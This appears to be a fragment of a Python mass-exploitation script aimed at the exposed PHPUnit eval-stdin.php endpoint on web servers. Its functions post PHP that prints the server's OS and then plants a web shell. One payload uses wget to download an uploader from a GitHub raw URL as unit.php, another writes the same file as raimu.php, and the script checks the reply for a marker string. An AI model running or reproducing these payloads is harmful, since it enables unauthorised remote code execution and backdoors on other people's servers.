...
def rce(url):
    try:
        ...
        upshell = '<?php system("wget https://raw.githubusercontent.com/project337/uploader/main/up -O unit.php"); ?>'
        url = url.strip()
        ...
        if 'Linux' in cek.text:
            ...
            if 'Lutfifakee' in cekshell.text:
...
def rce2(url):
    try:
        cekos = '<?php echo php_uname("a"); ?>'
        upshell = '<?php fwrite(fopen("raimu.php","w+"),file_get_contents("https://raw.githubusercontent.com/project337/uploader/main/up")); ?>'
        url = url.strip()
        cek = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos, timeout=50)
        if 'Linux' in cek.text:
            print("[os] " + cek.text)
